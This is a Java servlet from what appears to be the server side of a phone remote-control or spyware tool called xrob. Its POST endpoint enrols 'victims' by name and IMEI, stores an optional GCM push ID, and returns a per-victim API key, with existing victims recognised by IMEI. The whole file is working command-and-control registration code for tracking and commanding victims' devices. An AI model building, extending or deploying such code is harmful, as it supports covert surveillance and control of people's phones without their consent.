package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Clients;
import com.theah64.xrob.api.database.tables.Victims;
import com.theah64.xrob.api.models.Victim;
import com.theah64.xrob.api.utils.JSONUtils;
import com.theah64.xrob.api.utils.RandomString;
import com.theah64.xrob.api.utils.Request;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Random;

/**
 * Used to create new victim
 * Needed params
 * 1) Name
 * 2) Imei
 * 3) GCM ID - Optional
 */
@WebServlet(name = "IN Servlet", urlPatterns = {BaseServlet.VERSION_CODE + "/in"})
public class INServlet extends BaseServlet {

    private static final String[] requiredParams = {Victims.COLUMN_NAME, Victims.COLUMN_IMEI};
    private static final int API_KEY_LENGTH = 10;

    protected void doPost(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws ServletException, IOException {
        servletResponse.setContentType(CONTENT_TYPE_JSON);

        //Preparing writer
        final PrintWriter out = servletResponse.getWriter();

        try {

            final Request request = new Request(servletRequest, requiredParams);

            final String imei = request.getStringParameter(Victims.COLUMN_IMEI);
            final Victims victimsTable = Victims.getInstance();
            final Victim oldVictim = victimsTable.get(Victims.COLUMN_IMEI, imei);

            final String apiKey;

            if (oldVictim == null) {

                //Victim doesn't exists, so create new account
                final String name = request.getStringParameter(Victims.COLUMN_NAME);

                //GCM ID may be null
                String gcmId = request.getStringParameter(Victims.COLUMN_GCM_ID);
                if (gcmId != null && gcmId.isEmpty()) {
                    gcmId = null;
                }

                //Preparing new api key for new victim
                apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);

                final Victim newVictim = new Victim(name, imei, apiKey, gcmId);

                victimsTable.addv2(newVictim);

            } else {

                final String gcmId = request.getStringParameter(Victims.COLUMN_GCM_ID);

                if (gcmId != null && !gcmId.isEmpty() && !oldVictim.getGCMId().equals(gcmId)) {
                    //New GCM ID so update
                    victimsTable.update(Victims.COLUMN_IMEI, imei, Victims.COLUMN_GCM_ID, gcmId);
                }

                //Old victim!
                apiKey = oldVictim.getApiKey();
            }


            //Finally
            out.write(JSONUtils.getSuccessJSON(Victims.COLUMN_API_KEY, apiKey));

        } catch (Exception e) {
            out.write(JSONUtils.getErrorJSON(e.getMessage()));
        }


        //Closing writer
        out.flush();
        out.close();

    }

    //GET METHOD NOT SUPPORTED ###
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        setGETMethodNotSupported(response);
    }


}
